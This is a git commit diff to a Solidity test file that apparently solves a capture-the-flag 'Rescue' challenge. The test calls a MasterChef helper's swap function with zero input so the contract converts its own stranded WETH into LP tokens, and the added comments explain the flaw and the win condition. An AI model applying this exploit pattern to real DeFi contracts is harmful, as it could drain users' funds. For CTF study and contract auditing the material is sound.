bf5f6354c61ee81df22c4e520f19247e5c994f2e
saucepoint <saucepoint@protonmail.com>
2022-08-19 21:53:22 -0400

    docs

--- test/Rescue.t.sol
+++ test/Rescue.t.sol
@@ -18,12 +18,19 @@ contract ContractTest is Test {
         address weth = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
         MasterChefHelper c = MasterChefHelper(setup.mcHelper());
 
+        // Solution:
+        //   win condition: weth.balanceOf(MasterChefHelper) == 0
+        //   MasterChefHelper._addLiquidity will convert the contract's LP underlying into an LP
+        //   therefore, we just need to call swapTokenForPoolToken() such that it converts existing WETH into an LP
+        //   so realistically we just need to find a pool that uses WETH as one of its tokens
+
         // crawl the pools looking for a pair that is mapped to WETH
+        uint256 SEARCH_LIMIT = 10;  // how many masterchef.poolInfos we should check. arbitrary value
         uint256 poolId;
         address lpToken;
         address tokenOut0;
         address tokenOut1;
-        for (uint256 i = 0; i < 10; i++) {
+        for (uint256 i = 0; i < SEARCH_LIMIT; i++) {
             (lpToken,,,) = c.masterchef().poolInfo(i);
             tokenOut0 = UniswapV2PairLike(lpToken).token0();
             tokenOut1 = UniswapV2PairLike(lpToken).token1();
@@ -33,11 +40,13 @@ contract ContractTest is Test {
             }
         }
 
-
-        address tokenIn = weth;  // contract will return the WETH into an LP
+        address tokenIn = weth;  // any valid ERC20 could be used here, we know for a fact WETH is one of them
         uint256 amountIn = 0;  // we got no tokens ourselves!
-        uint256 minAmountOut = 0;  // avoid revert
+        uint256 minAmountOut = 0;  // avoids revert
+        ERC20Like(weth).approve(address(c), type(uint256).max);
         c.swapTokenForPoolToken(poolId, tokenIn, amountIn, minAmountOut);
+
+        // sneaky win condition: MasterChefHelper does not hold WETH :)
         assertEq(ERC20Like(weth).balanceOf(address(c)), 0);
     }
 }
